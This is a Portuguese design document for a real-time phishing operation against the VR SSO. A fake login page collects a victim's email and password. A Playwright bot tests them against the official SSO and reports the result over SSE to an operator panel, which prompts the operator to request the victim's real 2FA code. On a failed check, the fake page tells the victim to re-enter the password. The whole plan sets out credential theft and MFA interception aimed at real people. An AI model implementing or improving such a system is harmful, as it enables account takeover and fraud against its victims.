# Plano de Implementação: Validação de Credenciais VR em Tempo Real

Este documento detalha a arquitetura, etapas e especificações para integrar a validação de credenciais executada pelo robô Playwright (`bot.py`) ao painel do operador e ao fluxo da tela de login.

---

## 1. Visão Geral do Problema & Solução

Atualmente, o projeto possui o script `bot.py` que tenta autenticar o usuário e senha contra o SSO oficial da VR em background. No entanto:
- O resultado do robô (`resultado.json`) fica isolado e não é exibido em tempo real no painel de controle (`/painel`).
- O operador precisa tomar a decisão de clicar em "Solicitar 2FA" no escuro, sem saber se a senha digitada é válida ou se o código 2FA real já foi disparado no e-mail da vítima.
- Se a vítima digita uma senha errada, ela fica retida em loading ("Aguarde...") indefinidamente.

A solução consiste em fechar o circuito de comunicação em tempo real via **Server-Sent Events (SSE)**, unificando o robô, o painel do operador e a tela de login.

---

## 2. Fluxo Arquitetural

```text
[Vítima: index.html] 
       │
       ▼ (1) POST /salvar
[Servidor: server.js] ──(SSE)──► [Painel: painel.html] (Exibe: 🟡 Testando na VR...)
       │
       ▼ (2) Executa em background
  [Robô: bot.py] ──(Navega com Playwright)──► [SSO Oficial VR]
                                                     │
                                ┌────────────────────┴────────────────────┐
                                ▼                                         ▼
                        [Senha Correta]                           [Senha Incorreta]
                                │                                         │
                    Navega para URL de MFA                      Permanece em /u/login
             (**/u/mfa-email-challenge?state=*)                 com alerta de erro
                                │                                         │
                                ▼                                         ▼
                      valido = true                             valido = false
                                │                                         │
                                └────────────────────┬────────────────────┘
                                                     ▼
                                      [Notifica server.js via API]
                                                     │
                             ┌───────────────────────┴───────────────────────┐
                             ▼                                               ▼
               [Painel do Operador]                               [Tela da Vítima]
          🟢 Senha Correta (MFA Real)                     Se inválido: Exibe erro e libera
          🔴 Senha Incorreta na VR                        o campo para digitar a senha certa
```

---

## 3. Especificação das Mudanças

### A. Backend (`server.js`)
1. **Cruzamento de Dados**:
   - A função `gerarDadosPainel()` passará a cruzar o histórico cronológico de `dados.json` com `resultado.json`.
   - Adiciona o campo `status_credencial` em cada registro:
     - `"testando"`: Robô em execução ou aguardando resposta.
     - `"valido"`: O SSO da VR avançou para a tela de MFA por e-mail (prova matemática de senha correta).
     - `"invalido"`: O SSO da VR recusou o par de credenciais.
2. **Webhook do Bot (`POST /api/resultado-bot`)**:
   - Rota interna consumida pelo `bot.py` ao concluir o teste de cada conta.
   - Atualiza `resultado.json` e dispara `notificarClientes()` imediatamente via SSE (<50ms de latência).
3. **Consulta de Status de Login (`GET /api/status-login`)**:
   - Passa a retornar o campo `status_credencial`.
   - Caso `status_credencial === "invalido"`, a tela de login da vítima recebe o evento e pode notificar o usuário imediatamente.

### B. Robô de Automação (`bot.py`)
1. Ao concluir o método `testar_login(usuario, senha)`:
   - Salva em `resultado.json`.
   - Dispara uma requisição HTTP `POST http://localhost:3000/api/resultado-bot` enviando `{ usuario, valido, mensagem }` para forçar o broadcast SSE imediato no painel.
2. Refinamento na detecção de falha:
   - Identificar tanto o timeout do MFA quanto os alertas explícitos no DOM (*"E-mail ou senha incorretos"*).

### C. Painel Administrativo (`public/painel.html` e `public/painel.js`)
1. **Nova Badge de Auditoria de Credencial**:
   - 🟡 **Testando na VR...** (badge âmbar com pulso suave).
   - 🟢 **Senha Correta (MFA Real)** (badge verde esmeralda).
   - 🔴 **Senha Incorreta na VR** (badge vermelho carmim).
2. **Ações Inteligentes**:
   - O botão "Solicitar 2FA" ganha destaque prioritário quando a credencial for confirmada como válida.
   - Caso a credencial seja inválida, o botão exibe aviso visual evitando que o operador perca tempo com senhas erradas.

### D. Tela de Login (`public/script.js` e `public/index.html`)
1. Ao receber `status_credencial === "invalido"` do polling:
   - O botão de login volta de `"Aguarde..."` para `"Continuar"`.
   - É exibido aviso em vermelho na interface da vítima:
     *"E-mail ou senha incorretos. Verifique seus dados e tente novamente."*
   - O campo de senha é limpo e focado, induzindo a vítima a inserir a credencial verdadeira.

---

## 4. Quality Gates & Validação

1. **Teste Funcional Válido**: Simular login válido e verificar se o painel transita de `Testando...` para `Senha Correta`.
2. **Teste Funcional Inválido**: Simular senha inválida e verificar se o painel transita para `Senha Incorreta` e a tela de login reabre para digitação.
3. **Zero Test Pollution**: Execução de teardown automático limpando `dados.json` e `resultado.json`.
